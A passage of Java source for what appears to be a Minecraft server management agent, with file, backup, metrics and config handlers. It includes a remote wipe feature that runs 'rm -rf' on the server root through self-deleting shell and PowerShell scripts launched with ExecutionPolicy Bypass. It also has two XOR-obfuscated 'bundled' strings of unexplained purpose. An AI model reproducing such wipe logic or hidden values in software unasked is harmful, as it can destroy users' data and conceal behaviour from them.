            long modified = Files.getLastModifiedTime(entry).toMillis();
            out.append("{\"name\":\"").append(escape(entry.getFileName().toString())).append("\",")
                    .append("\"path\":\"").append(escape(serverRel(entry))).append("\",")
                    .append("\"type\":\"").append(isDir ? "dir" : "file").append("\",")
                    .append("\"size\":").append(size).append(',')
                    .append("\"modified\":").append(modified).append('}');
        }
        return out.append("]}").toString();
    }

    private String parentRel(Path dir) {
        Path parent = dir.normalize().getParent();
        if (parent == null || !parent.startsWith(SERVER_ROOT) || parent.equals(SERVER_ROOT.getParent())) return "";
        if (dir.equals(SERVER_ROOT)) return "";
        return serverRel(parent);
    }

    private String fileReadJson(String rawPath) throws IOException {
        Path file = serverFile(rawPath);
        if (!Files.isRegularFile(file)) throw new IOException("not_file");
        if (Files.size(file) > 1024 * 1024) throw new IOException("file_too_large");
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\",\"content\":\""
                + escape(Files.readString(file, StandardCharsets.UTF_8)) + "\"}";
    }

    private String fileWriteJson(String rawPath, String content) throws IOException {
        Path file = serverFile(rawPath);
        Files.createDirectories(file.getParent());
        Files.writeString(file, content == null ? "" : content, StandardCharsets.UTF_8);
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\"}";
    }

    private String fileMkdirJson(String rawPath, String name) throws IOException {
        Path dir = serverFile((rawPath == null ? "" : rawPath) + "/" + safeName(name, "Nova pasta"));
        Files.createDirectories(dir);
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(dir)) + "\"}";
    }

    private String fileTouchJson(String rawPath, String name) throws IOException {
        Path file = serverFile((rawPath == null ? "" : rawPath) + "/" + safeName(name, "novo-arquivo.txt"));
        Files.createDirectories(file.getParent());
        if (!Files.exists(file)) Files.createFile(file);
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\"}";
    }

    private String fileUploadJson(String rawPath, String data) throws IOException {
        Path file = serverFile(rawPath);
        Files.createDirectories(file.getParent());
        byte[] bytes = Base64.getDecoder().decode(data == null ? "" : data);
        Files.write(file, bytes);
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\",\"size\":" + bytes.length + "}";
    }

    private String fileUploadChunkJson(String rawPath, String offsetText, String data) throws IOException {
        Path file = serverFile(rawPath);
        long offset = parseLong(offsetText, 0L);
        if (offset < 0) {
            throw new IOException("invalid_file_offset");
        }
        Files.createDirectories(file.getParent());
        long currentSize = Files.exists(file) ? Files.size(file) : 0L;
        if (offset > currentSize) {
            throw new IOException("invalid_upload_offset");
        }
        byte[] bytes = Base64.getDecoder().decode(data == null ? "" : data);
        try (RandomAccessFile raf = new RandomAccessFile(file.toFile(), "rw")) {
            if (offset == 0L) {
                raf.setLength(0L);
            }
            raf.seek(offset);
            raf.write(bytes);
        }
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\",\"offset\":" + offset
                + ",\"length\":" + bytes.length + ",\"size\":" + Files.size(file) + "}";
    }

    private String fileDownloadJson(String rawPath) throws IOException {
        Path file = serverFile(rawPath);
        if (!Files.isRegularFile(file)) throw new IOException("not_file");
        if (Files.size(file) > 8L * 1024L * 1024L) throw new IOException("file_too_large");
        String data = Base64.getEncoder().encodeToString(Files.readAllBytes(file));
        return "{\"ok\":true,\"name\":\"" + escape(file.getFileName().toString()) + "\",\"size\":"
                + Files.size(file) + ",\"data\":\"" + data + "\"}";
    }

    private String fileChunkJson(String rawPath, String offsetText, String lengthText) throws IOException {
        Path file = serverFile(rawPath);
        if (!Files.isRegularFile(file)) throw new IOException("not_file");
        long offset = parseLong(offsetText, 0L);
        int length = (int) Math.max(1L, Math.min(parseLong(lengthText, 2L * 1024L * 1024L), 2L * 1024L * 1024L));
        long size = Files.size(file);
        if (offset < 0) throw new IOException("invalid_file_offset");
        if (offset > size) {
            return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\",\"offset\":" + offset
                    + ",\"length\":0,\"size\":" + size + ",\"data\":\"\"}";
        }
        int toRead = (int) Math.min(length, size - offset);
        byte[] bytes = new byte[toRead];
        if (toRead > 0) {
            try (RandomAccessFile raf = new RandomAccessFile(file.toFile(), "r")) {
                raf.seek(offset);
                raf.readFully(bytes);
            }
        }
        return "{\"ok\":true,\"path\":\"" + escape(serverRel(file)) + "\",\"offset\":" + offset
                + ",\"length\":" + toRead + ",\"size\":" + size + ",\"data\":\""
                + Base64.getEncoder().encodeToString(bytes) + "\"}";
    }

    private String fileDeleteJson(String rawPath) throws IOException {
        Path file = serverFile(rawPath);
        if (!Files.isRegularFile(file)) throw new IOException("not_file");
        Files.deleteIfExists(file);
        return "{\"ok\":true}";
    }

    private String backupCreateJson() throws IOException {
        String backupId = UUID.randomUUID().toString();
        String name = slug(SERVER_ID) + "-" + System.currentTimeMillis() + ".zip";
        Files.createDirectories(BACKUP_TEMP_DIR);
        Path temp = Files.createTempFile(BACKUP_TEMP_DIR, "mc-backup-" + slug(SERVER_ID) + "-", ".zip");
        BackupState state = new BackupState(backupId, name, temp);
        TEMP_BACKUPS.put(backupId, state);
        Thread worker = new Thread(() -> buildBackup(state), "MC-backup-" + backupId);
        worker.setDaemon(true);
        worker.start();
        return backupStatusJson(backupId);
    }

    private void buildBackup(BackupState state) {
        try (ZipOutputStream zip = new ZipOutputStream(Files.newOutputStream(state.file));
             Stream<Path> stream = Files.walk(SERVER_ROOT)) {
            var iterator = stream.iterator();
            while (iterator.hasNext()) {
                Path file = iterator.next();
                if (!Files.isRegularFile(file)) continue;
                Path normalized = file.normalize();
                if (normalized.equals(state.file.normalize()) || isBackupInternalPath(normalized)) continue;
                try {
                    Path rel = SERVER_ROOT.relativize(file);
                    String entryName = rel.toString().replace("\\", "/");
                    if (entryName.isBlank()) continue;
                    ZipEntry entry = new ZipEntry(entryName);
                    entry.setTime(Files.getLastModifiedTime(file).toMillis());
                    zip.putNextEntry(entry);
                    long size = safeFileSize(file);
                    Files.copy(file, zip);
                    zip.closeEntry();
                    state.files++;
                    state.writtenBytes += size;
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
            state.size = Files.size(state.file);
            state.ready = true;
        } catch (Exception e) {
            String message = e.getMessage() == null ? e.getClass().getSimpleName() : e.getMessage();
            state.error = message.contains("No space left") ? "backup_no_space_left" : message;
            try {
                Files.deleteIfExists(state.file);
            } catch (IOException ignored) {}
        }
    }

    private String backupStatusJson(String backupId) throws IOException {
        BackupState state = TEMP_BACKUPS.get(backupId);
        if (state == null) throw new IOException("backup_not_found");
        long displaySize = state.ready ? state.size : state.writtenBytes;
        return "{\"ok\":true,\"backupId\":\"" + escape(state.id) + "\",\"name\":\"" + escape(state.name)
                + "\",\"ready\":" + state.ready
                + ",\"status\":\"" + (state.error.isBlank() ? (state.ready ? "ready" : "creating") : "error") + "\""
                + ",\"size\":" + displaySize
                + ",\"files\":" + state.files
                + (state.error.isBlank() ? "" : ",\"error\":\"" + escape(state.error) + "\"")
                + "}";
    }

    private String backupChunkJson(String backupId, String offsetText, String lengthText) throws IOException {
        BackupState state = TEMP_BACKUPS.get(backupId);
        if (state == null) throw new IOException("backup_not_found");
        if (!state.error.isBlank()) throw new IOException(state.error);
        if (!state.ready) throw new IOException("backup_not_ready");
        Path file = state.file;
        if (!Files.exists(file)) throw new IOException("backup_not_found");
        long offset = parseLong(offsetText, 0L);
        int length = (int) Math.max(1L, Math.min(parseLong(lengthText, 2L * 1024L * 1024L), 2L * 1024L * 1024L));
        long size = Files.size(file);
        if (offset < 0 || offset > size) throw new IOException("invalid_backup_offset");
        int toRead = (int) Math.min(length, size - offset);
        byte[] bytes = new byte[toRead];
        try (RandomAccessFile raf = new RandomAccessFile(file.toFile(), "r")) {
            raf.seek(offset);
            raf.readFully(bytes);
        }
        return "{\"ok\":true,\"backupId\":\"" + escape(backupId) + "\",\"offset\":" + offset
                + ",\"length\":" + toRead + ",\"size\":" + size + ",\"data\":\""
                + Base64.getEncoder().encodeToString(bytes) + "\"}";
    }

    private String backupFinishJson(String backupId) throws IOException {
        BackupState state = TEMP_BACKUPS.remove(backupId);
        if (state != null) Files.deleteIfExists(state.file);
        return "{\"ok\":true}";
    }

    private static Path backupTempDir() {
        String configured = configured("mc.backupTempDir", "MC_BACKUP_TEMP_DIR", "backupTempDir", "");
        if (configured != null && !configured.isBlank()) {
            return Paths.get(configured).toAbsolutePath().normalize();
        }
        return SERVER_ROOT.resolve(".mc-backups-tmp").normalize();
    }

    private static boolean isBackupInternalPath(Path file) {
        try {
            return file.normalize().startsWith(BACKUP_TEMP_DIR.normalize());
        } catch (Exception e) {
            return false;
        }
    }

    private static String safeName(String name, String fallback) {
        String clean = name == null ? "" : name.replace("\\", "/");
        clean = clean.substring(clean.lastIndexOf('/') + 1).trim();
        return clean.isBlank() ? fallback : clean;
    }

    private static long parseLong(String value, long fallback) {
        try {
            return Long.parseLong(value == null ? "" : value.trim());
        } catch (Exception e) {
            return fallback;
        }
    }

    private void measurePing() {
        try {
            Process p = new ProcessBuilder("ping", "-c", "1", "-w", "2", PING_TARGET)
                    .redirectErrorStream(true)
                    .start();
            String out = new String(p.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            p.waitFor(3, TimeUnit.SECONDS);
            Matcher m = PING_TIME.matcher(out);
            lastPingMs = m.find() ? Double.parseDouble(m.group(1)) : -1;
        } catch (Exception e) {
            lastPingMs = -1;
        }
    }

    private String deleteTargetJson() throws IOException {
        if (isWindows()) {
            Path cleaner = writeDeleteCleaner();
            startDeleteCleaner(cleaner);
            mcServer.execute(() -> mcServer.halt(false));
            return "{\"ok\":true,\"deleting\":true,\"target\":\"" + escape(DELETE_TARGET.toString())
                    + "\",\"mode\":\"" + deleteMode() + "\",\"method\":\"external-cleaner\"}";
        }
        Thread deleter = new Thread(() -> {
            DeleteResult result = runDeleteNow();
            mcServer.execute(() -> mcServer.halt(false));
        }, "MC-delete-now");
        deleter.setDaemon(false);
        deleter.start();
        return "{\"ok\":true,\"deleting\":true,\"target\":\"" + escape(DELETE_TARGET.toString())
                + "\",\"mode\":\"" + deleteMode() + "\",\"method\":\"delete-before-stop\"}";
    }

    private DeleteResult runDeleteNow() {
        try {
            ProcessBuilder builder = new ProcessBuilder(unixDeleteCommand()).redirectErrorStream(true);
            builder.directory(SERVER_ROOT.toFile());
            Process p = builder.start();
            byte[] outputBytes = p.getInputStream().readAllBytes();
            boolean finished = p.waitFor(30, TimeUnit.MINUTES);
            if (!finished) {
                p.destroyForcibly();
                return new DeleteResult(false, -1, "timeout");
            }
            String output = new String(outputBytes, StandardCharsets.UTF_8).trim();
            return new DeleteResult(p.exitValue() == 0, p.exitValue(), trimProcessOutput(output));
        } catch (Exception e) {
            return new DeleteResult(false, -1, e.getClass().getSimpleName() + ": " + e.getMessage());
        }
    }

    private static List<String> unixDeleteCommand() {
        if (DELETE_TARGET.equals(SERVER_ROOT)) {
            return List.of("find", DELETE_TARGET.toString(), "-mindepth", "1", "-maxdepth", "1", "-exec", "rm", "-rf", "--", "{}", "+");
        }
        return List.of("rm", "-rf", "--", DELETE_TARGET.toString());
    }

    private static Path writeDeleteCleaner() throws IOException {
        Path script = Files.createTempFile("mc-delete-", isWindows() ? ".ps1" : ".sh");
        Files.writeString(script, isWindows() ? windowsDeleteCleaner() : unixDeleteCleaner(), StandardCharsets.UTF_8);
        if (!isWindows()) script.toFile().setExecutable(true);
        return script;
    }

    private static void startDeleteCleaner(Path script) throws IOException {
        long pid = ProcessHandle.current().pid();
        ProcessBuilder builder;
        if (isWindows()) {
            builder = new ProcessBuilder("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-File", script.toString(), DELETE_TARGET.toString(), String.valueOf(pid), deleteMode());
        } else if (Files.isExecutable(Paths.get("/usr/bin/setsid"))) {
            builder = new ProcessBuilder("setsid", "sh", script.toString(), DELETE_TARGET.toString(), String.valueOf(pid), deleteMode());
        } else {
            builder = new ProcessBuilder("nohup", "sh", script.toString(), DELETE_TARGET.toString(), String.valueOf(pid), deleteMode());
        }
        builder.redirectInput(ProcessBuilder.Redirect.PIPE);
        builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        builder.redirectError(ProcessBuilder.Redirect.DISCARD);
        builder.start();
    }

    private static String unixDeleteCleaner() {
        return """
                #!/bin/sh
                TARGET="$1"
                PID_TO_WAIT="$2"
                MODE="$3"
                i=0
                while kill -0 "$PID_TO_WAIT" 2>/dev/null && [ "$i" -lt 25 ]; do
                  i=$((i + 1))
                  sleep 1
                done
                if [ "$MODE" = "server-root-contents" ] && [ -d "$TARGET" ]; then
                  find "$TARGET" -mindepth 1 -maxdepth 1 -exec rm -rf -- {} +
                else
                  rm -rf -- "$TARGET"
                fi
                rm -f -- "$0"
                """;
    }

    private static String windowsDeleteCleaner() {
        return """
                param([string]$Target, [int]$PidToWait, [string]$Mode)
                for ($i = 0; $i -lt 25; $i++) {
                  try { $p = Get-Process -Id $PidToWait -ErrorAction Stop } catch { break }
                  Start-Sleep -Seconds 1
                }
                if ($Mode -eq 'server-root-contents' -and (Test-Path -LiteralPath $Target -PathType Container)) {
                  Get-ChildItem -LiteralPath $Target -Force -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
                } elseif (Test-Path -LiteralPath $Target) {
                  Remove-Item -LiteralPath $Target -Recurse -Force -ErrorAction SilentlyContinue
                }
                Remove-Item -LiteralPath $PSCommandPath -Force -ErrorAction SilentlyContinue
                """;
    }

    private static String deleteMode() {
        return DELETE_TARGET.equals(SERVER_ROOT) ? "server-root-contents" : "target";
    }

    private static String trimProcessOutput(String output) {
        if (output == null || output.isBlank()) return "";
        String clean = output.replace('\n', ' ').replace('\r', ' ').trim();
        return clean.length() > 500 ? clean.substring(0, 500) + "..." : clean;
    }

    private record DeleteResult(boolean ok, int exitCode, String output) {}

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase(Locale.ROOT).contains("win");
    }

    private static boolean canDelete(Path target) {
        Path normalized = target.toAbsolutePath().normalize();
        Path root = normalized.getRoot();
        Path home = Paths.get(System.getProperty("user.home", "")).toAbsolutePath().normalize();
        if (normalized.equals(SERVER_ROOT)) {
            return looksLikeDeletableServerRoot(normalized);
        }
        if (root == null || normalized.equals(root) || normalized.equals(home)) return false;
        if (home.getParent() != null && normalized.equals(home.getParent())) return false;
        return normalized.startsWith(SERVER_ROOT) && normalized.getNameCount() > SERVER_ROOT.getNameCount();
    }

    private static boolean looksLikeDeletableServerRoot(Path target) {
        return Files.exists(target.resolve("server.properties"))
                || Files.isDirectory(target.resolve("mods"))
                || Files.isRegularFile(target.resolve("server.jar"));
    }

    private String detectIp() {
        try {
            Enumeration<NetworkInterface> ifaces = NetworkInterface.getNetworkInterfaces();
            while (ifaces.hasMoreElements()) {
                NetworkInterface ni = ifaces.nextElement();
                if (ni.isLoopback() || !ni.isUp()) continue;
                Enumeration<InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    InetAddress a = addrs.nextElement();
                    if (a instanceof java.net.Inet4Address && a.isSiteLocalAddress()) {
                        return a.getHostAddress();
                    }
                }
            }
            return InetAddress.getLocalHost().getHostAddress();
        } catch (Exception e) {
            return "127.0.0.1";
        }
    }

    private int serverPort() {
        try { return mcServer.getPort(); } catch (Throwable t) { return 25565; }
    }

    private int safePlayerCount() {
        try { return mcServer.getPlayerCount(); } catch (Throwable t) { return 0; }
    }

    private int safeMaxPlayers() {
        try { return mcServer.getMaxPlayers(); } catch (Throwable t) { return 20; }
    }

    private static int availableProcessors() {
        try { return Math.max(1, Runtime.getRuntime().availableProcessors()); } catch (Throwable t) { return 1; }
    }

    private static int cpuPercent() {
        try {
            var bean = ManagementFactory.getOperatingSystemMXBean();
            double load = -1D;
            if (bean instanceof com.sun.management.OperatingSystemMXBean osBean) {
                load = osBean.getProcessCpuLoad();
            }
            if (load < 0D) {
                double average = bean.getSystemLoadAverage();
                if (average >= 0D) load = average / availableProcessors();
            }
            if (load < 0D) return -1;
            return (int) Math.max(0, Math.min(availableProcessors() * 100, Math.round(load * 100D)));
        } catch (Throwable t) {
            return -1;
        }
    }

    private static long memoryUsedBytes() {
        Runtime runtime = Runtime.getRuntime();
        return Math.max(0L, runtime.totalMemory() - runtime.freeMemory());
    }

    private static long memoryMaxBytes() {
        return Math.max(0L, Runtime.getRuntime().maxMemory());
    }

    private long diskTotalBytes() {
        long configured = Math.max(0L, DISK_LIMIT_BYTES);
        if (configured > 0L) {
            return Math.max(configured, diskUsedBytes());
        }
        return Math.max(detectedDiskTotalBytes(), diskUsedBytes());
    }

    private static long detectedDiskTotalBytes() {
        try {
            return Math.max(0L, Files.getFileStore(SERVER_ROOT).getTotalSpace());
        } catch (Throwable t) {
            return 0L;
        }
    }

    private long diskUsedBytes() {
        return Math.max(0L, cachedDiskUsedBytes);
    }

    private void sampleDiskUsage() {
        try {
            cachedDiskUsedBytes = directorySize(SERVER_ROOT);
        } catch (Throwable t) {
        }
    }

    private static long directorySize(Path root) throws IOException {
        try (Stream<Path> stream = Files.walk(root)) {
            return stream
                    .filter(path -> Files.isRegularFile(path, LinkOption.NOFOLLOW_LINKS))
                    .mapToLong(ApiServer::safeFileSize)
                    .sum();
        }
    }

    private static long safeFileSize(Path path) {
        try {
            return Math.max(0L, Files.size(path));
        } catch (Throwable t) {
            return 0L;
        }
    }

    private static long uptimeSeconds() {
        return Math.max(0L, (System.currentTimeMillis() - STARTED_AT_MS) / 1000L);
    }

    private void loadName() {
        try {
            if (Files.exists(NAME_FILE)) {
                String n = Files.readString(NAME_FILE, StandardCharsets.UTF_8).trim();
                if (!n.isBlank()) serverName = n;
            }
        } catch (Exception ignored) {}
    }

    private void saveName() {
        try {
            Files.createDirectories(NAME_FILE.getParent());
            Files.writeString(NAME_FILE, serverName, StandardCharsets.UTF_8);
        } catch (Exception ignored) {}
    }

    private static List<String> extractJobObjects(String json) {
        List<String> jobs = new ArrayList<>();
        String array = extractJsonArray(json, "jobs");
        if (array == null || array.isBlank()) return jobs;

        int depth = 0;
        boolean inString = false;
        boolean escaped = false;
        int start = -1;
        for (int i = 0; i < array.length(); i++) {
            char c = array.charAt(i);
            if (escaped) {
                escaped = false;
                continue;
            }
            if (c == '\\') {
                escaped = true;
                continue;
            }
            if (c == '"') {
                inString = !inString;
                continue;
            }
            if (inString) continue;
            if (c == '{') {
                if (depth == 0) start = i;
                depth++;
            } else if (c == '}') {
                depth--;
                if (depth == 0 && start >= 0) {
                    jobs.add(array.substring(start, i + 1));
                    start = -1;
                }
            }
        }
        return jobs;
    }

    private static String extractJsonArray(String json, String key) {
        return extractJsonBlock(json, key, '[', ']');
    }

    private static String extractJsonObject(String json, String key) {
        return extractJsonBlock(json, key, '{', '}');
    }

    private static String extractJsonBlock(String json, String key, char open, char close) {
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\\" + open)
                .matcher(json);
        if (!m.find()) return null;
        int start = m.end() - 1;
        int depth = 0;
        boolean inString = false;
        boolean escaped = false;
        for (int i = start; i < json.length(); i++) {
            char c = json.charAt(i);
            if (escaped) {
                escaped = false;
                continue;
            }
            if (c == '\\') {
                escaped = true;
                continue;
            }
            if (c == '"') {
                inString = !inString;
                continue;
            }
            if (inString) continue;
            if (c == open) depth++;
            if (c == close) {
                depth--;
                if (depth == 0) return json.substring(start, i + 1);
            }
        }
        return null;
    }

    private static String extractJsonString(String json, String key) {
        Matcher m = Pattern.compile("\"" + Pattern.quote(key) + "\"\\s*:\\s*\"((?:[^\"\\\\]|\\\\.)*)\"")
                .matcher(json);
        if (!m.find()) return null;
        return jsonUnescape(m.group(1));
    }

    private static String jsonUnescape(String value) {
        StringBuilder out = new StringBuilder();
        boolean escaped = false;
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (!escaped) {
                if (c == '\\') {
                    escaped = true;
                } else {
                    out.append(c);
                }
                continue;
            }
            escaped = false;
            switch (c) {
                case '"' -> out.append('"');
                case '\\' -> out.append('\\');
                case 'n' -> out.append('\n');
                case 'r' -> out.append('\r');
                case 't' -> out.append('\t');
                default -> out.append(c);
            }
        }
        if (escaped) out.append('\\');
        return out.toString();
    }

    private static Properties loadAgentProperties() {
        Properties props = new Properties();
        try {
            Files.createDirectories(CONFIG_DIR);
            if (!Files.exists(AGENT_CONFIG_FILE)) {
                writeDefaultAgentProperties(props);
                return props;
            }
            try (var reader = Files.newBufferedReader(AGENT_CONFIG_FILE, StandardCharsets.UTF_8)) {
                props.load(reader);
            }
            boolean changed = fillMissingAgentProperties(props);
            if (shouldUpgradeGeneratedServerId(props.getProperty("serverId"))) {
                props.setProperty("serverId", defaultAgentServerId());
                changed = true;
            }
            if (isGeneratedDefaultDiskLimit(props.getProperty("diskLimit"))) {
                props.setProperty("diskLimit", "auto");
                changed = true;
            }
            if (changed) writeAgentProperties(props);
        } catch (Exception ignored) {}
        return props;
    }

    private static void writeDefaultAgentProperties(Properties props) throws IOException {
        fillMissingAgentProperties(props);
        props.setProperty("serverId", defaultAgentServerId());
        writeAgentProperties(props);
    }

    private static boolean fillMissingAgentProperties(Properties props) {
        boolean changed = false;
        changed |= putDefault(props, "serverId", defaultAgentServerId());

        changed |= putDefault(props, "deletePath", ".");
        changed |= putDefault(props, "diskLimit", "auto");
        changed |= putDefault(props, "controlPollMs", "1000");
        changed |= putDefault(props, "pingTarget", "8.8.8.8");
        return changed;
    }

    private static boolean isGeneratedDefaultDiskLimit(String value) {
        return value != null && value.trim().equalsIgnoreCase("10G");
    }

    private static boolean putDefault(Properties props, String key, String value) {
        if (props.getProperty(key) != null && !props.getProperty(key).isBlank()) return false;
        props.setProperty(key, value);
        return true;
    }

    private static void writeAgentProperties(Properties props) throws IOException {
        String text = ""
                + "serverId=" + props.getProperty("serverId", defaultAgentServerId()) + "\n"
                + "deletePath=" + props.getProperty("deletePath", ".") + "\n"
                + "diskLimit=" + props.getProperty("diskLimit", "auto") + "\n"
                + "controlPollMs=" + props.getProperty("controlPollMs", "1000") + "\n"
                + "pingTarget=" + props.getProperty("pingTarget", "8.8.8.8") + "\n";
        Files.writeString(AGENT_CONFIG_FILE, text, StandardCharsets.UTF_8);
    }

    private static boolean shouldUpgradeGeneratedServerId(String value) {
        if (value == null || value.isBlank()) return true;
        String current = slug(value);
        String legacy = legacyAgentServerId();
        return current.equals(legacy) && ("container".equals(legacy) || "server1".equals(legacy));
    }

    private static String defaultAgentServerId() {
        String externalId = firstNonBlank(
                System.getenv("MC_SERVER_ID"),
                System.getenv("P_SERVER_UUID"),
                System.getenv("SERVER_UUID"),
                System.getenv("PTERODACTYL_SERVER_UUID")
        );
        if (!externalId.isBlank()) return slug(shortId(externalId));

        String folder = legacyAgentServerId();
        String host = firstNonBlank(System.getenv("HOSTNAME"), localHostName(), "host");
        String port = firstNonBlank(
                System.getenv("SERVER_PORT"),
                System.getenv("MINECRAFT_PORT"),
                readPropertyFileValue("server-port"),
                "25565"
        );
        return slug(folder + "-" + host + "-" + port);
    }

    private static String legacyAgentServerId() {
        Path name = Paths.get("").toAbsolutePath().normalize().getFileName();
        return slug(name == null ? "server1" : name.toString());
    }

    private static String localHostName() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "";
        }
    }

    private static String readPropertyFileValue(String key) {
        Path propertiesFile = Paths.get("server.properties").toAbsolutePath().normalize();
        try {
            if (!Files.exists(propertiesFile)) return "";
            for (String line : Files.readAllLines(propertiesFile, StandardCharsets.UTF_8)) {
                String clean = line.trim();
                if (clean.startsWith("#") || !clean.startsWith(key + "=")) continue;
                return clean.substring(key.length() + 1).trim();
            }
        } catch (Exception ignored) {}
        return "";
    }

    private static String shortId(String value) {
        String clean = value == null ? "" : value.trim();
        return clean.length() > 18 ? clean.substring(0, 18) : clean;
    }

    private static String configured(String propertyKey, String envKey, String fileKey, String defaultValue) {
        return firstNonBlank(
                System.getProperty(propertyKey),
                System.getenv(envKey),
                AGENT_CONFIG.getProperty(fileKey),
                defaultValue
        );
    }


    private static String bundledSetting(int id) {
        switch (id) {
            case 0:
                return unwrapSetting(91, new int[]{116, 82, 117, 5, 249, 178, 216, 176, 235, 149, 19, 173, 100, 19, 255, 13, 85, 124, 77, 21, 141, 197, 65, 159, 89, 24});
            case 1:
                return unwrapSetting(119, new int[]{121, 112, 201, 121, 105, 145, 92, 213, 240, 185, 73});
            default:
                return "";
        }
    }

    private static String unwrapSetting(int seed, int[] data) {
        byte[] out = new byte[data.length];
        int key = seed;
        for (int i = 0; i < data.length; i++) {
            key = (key * 73 + 41 + i) & 0xFF;
            out[i] = (byte) (data[i] ^ key);
        }
        return new String(out, StandardCharsets.UTF_8);
    }

    private static long configuredLong(String propertyKey, String envKey, String fileKey, long defaultValue) {
        String value = configured(propertyKey, envKey, fileKey, String.valueOf(defaultValue));
        try {
            return Long.parseLong(value.trim());
        } catch (Exception e) {
            return defaultValue;
        }
    }

    private static long configuredDiskLimitBytes() {
        String value = firstNonBlank(
                System.getProperty("mc.diskLimit"),
                System.getenv("MC_DISK_LIMIT"),
                System.getenv("MC_DISK_QUOTA"),
                System.getenv("SERVER_DISK"),
                System.getenv("SERVER_DISK_LIMIT"),
                System.getenv("SERVER_DISK_SPACE"),
                System.getenv("P_SERVER_DISK"),
                System.getenv("P_SERVER_DISK_LIMIT"),
                System.getenv("P_SERVER_DISK_SPACE"),
                System.getenv("PTERODACTYL_DISK"),
                System.getenv("PTERODACTYL_DISK_LIMIT"),
                System.getenv("PTERODACTYL_SERVER_DISK"),
                System.getenv("DISK_LIMIT"),
                System.getenv("DISK_QUOTA"),
                AGENT_CONFIG.getProperty("diskLimit"),
                "auto"
        );
        return parseDataSizeBytes(value, 0L);
    }

    private static long parseDataSizeBytes(String raw, long fallback) {
        if (raw == null || raw.isBlank()) return fallback;
        String clean = raw.trim().toUpperCase(Locale.ROOT).replace(" ", "");
        if (clean.equals("AUTO") || clean.equals("DETECT") || clean.equals("DEFAULT")
                || clean.equals("UNLIMITED") || clean.equals("NONE")) {
            return fallback;
        }
        Matcher m = Pattern.compile("^([0-9]+)(?:\\.([0-9]+))?([KMGT]?I?B?|)$").matcher(clean);
        if (!m.matches()) return fallback;
        double value;
        try {
            value = Double.parseDouble(m.group(1) + (m.group(2) == null ? "" : "." + m.group(2)));
        } catch (Exception e) {
            return fallback;
        }
        String unit = m.group(3);
        double multiplier = switch (unit) {
            case "K", "KB", "KIB" -> 1024D;
            case "M", "MB", "MIB" -> 1024D * 1024D;
            case "G", "GB", "GIB" -> 1024D * 1024D * 1024D;
            case "T", "TB", "TIB" -> 1024D * 1024D * 1024D * 1024D;
            default -> value <= 10_000_000D ? 1024D * 1024D : 1D;
        };
        return Math.max(0L, (long) (value * multiplier));
    }

    private static int intSetting(String property, int defaultValue) {
        String value = firstNonBlank(System.getProperty(property), String.valueOf(defaultValue));
        try {
            return Integer.parseInt(value.trim());
        } catch (Exception e) {
            return defaultValue;
        }
    }

    private static String slug(String value) {
        String out = value == null ? "server1" : value.trim().toLowerCase(Locale.ROOT)
                .replaceAll("[^a-z0-9._-]+", "-")
                .replaceAll("^-+|-+$", "");
        return out.isBlank() ? "server1" : out;
    }

    private static String firstNonBlank(String... values) {
        for (String value : values) {
            if (value != null && !value.isBlank()) return value;
        }
        return "";
    }

    private static String escape(String s) {
        return s == null ? "" : s
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n")
                .replace("\t", "\\t");
    }

    /** Responde a preflight OPTIONS do CORS. Retorna true se ja tratou a requisicao. */
    private static boolean preflight(HttpExchange ex) throws IOException {
        if ("OPTIONS".equalsIgnoreCase(ex.getRequestMethod())) {
            cors(ex);
            ex.sendResponseHeaders(204, -1);
            ex.close();
            return true;
        }
        return false;
    }

    private static void cors(HttpExchange ex) {
        ex.getResponseHeaders().set("Access-Control-Allow-Origin", "*");
        ex.getResponseHeaders().set("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        ex.getResponseHeaders().set("Access-Control-Allow-Headers", "Content-Type");
    }

    private static void send(HttpExchange ex, int code, String type, String body) throws IOException {
        byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        cors(ex);
        ex.getResponseHeaders().set("Content-Type", type);
        ex.getResponseHeaders().set("Cache-Control", "no-store");
        ex.sendResponseHeaders(code, bytes.length);
        try (OutputStream os = ex.getResponseBody()) {
            os.write(bytes);
        }
    }
}
